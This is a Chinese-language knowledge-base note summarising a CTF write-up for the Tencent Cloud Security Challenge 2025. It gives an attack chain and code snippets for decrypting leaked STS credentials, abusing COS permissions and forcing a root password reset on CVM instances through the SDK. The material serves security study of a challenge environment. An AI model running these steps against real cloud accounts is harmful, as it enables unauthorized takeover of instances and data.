---
title: "腾讯云安全挑战赛 2025 WP"
category: cloud-security
tags: [ctf, 腾讯云, cloud-security, cos, cam, s3, sts]
triggers: [腾讯云安全挑战赛, COS提权, PutBucketACL, CVM密码重置, tccli, STS临时凭证]
created: 2026-06-10
updated: 2026-06-10
sources: [raw/腾讯云安全挑战赛2025wp.md, raw/腾讯云安全挑战赛第一期wp-先知社区.md]
---

# 腾讯云安全挑战赛 2025 WP

> 来源：6s6 | 腾讯云安全挑战赛第一期 — COS 提权与利用

## 核心攻击链

```
1. 拿到 AES-ECB 加密的 STS 临时凭证 → 解密获取 AK/SK/Token
2. 配置 tccli/aws cli → 枚举当前用户权限
3. 发现 PutBucketACL 权限（受 IP 限制）
4. DescribeInstances 列出 CVM 实例 → 部分实例 IP 在白名单内
5. 重设实例密码（需 Python SDK ForceStop 参数绕过）
6. SSH 登录 → 提权操作
```

## 凭证解密

```python
from Crypto.Cipher import AES

KEY = b"Lxnt1evByMdubwx9"
cipher = AES.new(KEY, AES.MODE_ECB)
dec = unpad(cipher.decrypt(base64.b64decode(enc_data)))
# dec 可能为双层加密: 先 AES 解密 → base64 → XOR(0x23)
```

## AWS CLI 配置（腾讯云 COS 兼容 S3）

```bash
# ~/.aws/config
[default]
region = ap-guangzhou
s3 =
    addressing_style = virtual

# ~/.aws/credentials
[default]
aws_access_key_id = <secretId>
aws_secret_access_key = <secretKey>
aws_session_token = <token>
```

## 重置 CVM 密码（无需停止实例）

```python
from tencentcloud.common.common_client import CommonClient
params = '{"InstanceIds":["ins-xxxxx"],"Password":"Aa112211.","UserName":"root","ForceStop":true}'
common_client = CommonClient("cvm", "2017-03-12", cred, "ap-guangzhou")
common_client.call_json("ResetInstancesPassword", json.loads(params))
```

关键参数 `ForceStop: true` — 强制不关机修改密码。

## Connections
- Related: [[cloud-security/pwnlabs-aws-cloud-security]], [[cloud-security/minio-cve-2025-31489-arbitrary-write]]
- Source: [[raw/腾讯云安全挑战赛2025wp]], [[raw/腾讯云安全挑战赛第一期wp-先知社区]]
